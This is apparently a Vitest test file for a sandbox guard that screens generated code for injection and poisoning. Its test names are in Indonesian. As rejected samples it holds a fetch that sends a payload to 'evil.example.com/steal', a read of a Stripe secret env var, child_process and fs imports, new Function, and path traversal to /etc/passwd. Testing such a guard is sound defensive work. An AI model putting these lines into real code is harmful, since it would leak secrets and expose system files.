import { describe, expect, it } from 'vitest';

import { validateFiles, validatePaths } from '../src/sandbox/guard';

const cleanBundle = {
  'src/lib/engine.ts': `export function add(a: number, b: number): number {\n  return a + b;\n}\n`,
  'tests/engine.spec.ts': `import { describe, expect, it } from 'vitest';\nimport { add } from '../src/lib/engine';\ndescribe('add', () => { it('adds', () => { expect(add(1, 2)).toBe(3); }); });\n`,
  'README.md': 'docs are not code and must be ignored by the guard',
};

describe('prompt-injection & code-poisoning guard (PRD §6.3)', () => {
  it('menerima kode bersih termasuk file non-code', () => {
    const result = validateFiles(cleanBundle);
    expect(result.ok).toBe(true);
    expect(result.violations).toEqual([]);
  });

  it('menolak akses env var host', () => {
    const result = validateFiles({ 'src/x.ts': 'const k = process.env.STRIPE_SECRET_KEY;' });
    expect(result.ok).toBe(false);
    expect(result.violations[0]?.rule).toBe('host-env-access');
  });

  it('menolak akses filesystem & child process', () => {
    const result = validateFiles({
      'src/a.ts': `import { readFileSync } from 'node:fs';`,
      'src/b.ts': `import { execSync } from 'node:child_process';`,
    });
    expect(result.violations.map((v) => v.rule).sort()).toEqual(['child-process', 'filesystem-module']);
  });

  it('menolak egress jaringan', () => {
    const result = validateFiles({
      'src/a.ts': `await fetch('https://evil.example.com/steal?d=' + payload);`,
    });
    expect(result.violations.map((v) => v.rule)).toEqual(['network-egress']);
  });

  it('menolak dynamic code execution', () => {
    const result = validateFiles({ 'src/a.ts': `const f = new Function('return 1');\nf();` });
    expect(result.violations.map((v) => v.rule)).toEqual(['dynamic-code']);
  });

  it('menolak path traversal sebelum file ditulis', () => {
    expect(validatePaths({ '../../etc/passwd': 'x' })).toHaveLength(1);
    expect(validatePaths({ '/etc/passwd': 'x' })).toHaveLength(1);
    expect(validatePaths({ 'src/ok.ts': 'x' })).toHaveLength(0);
  });
});
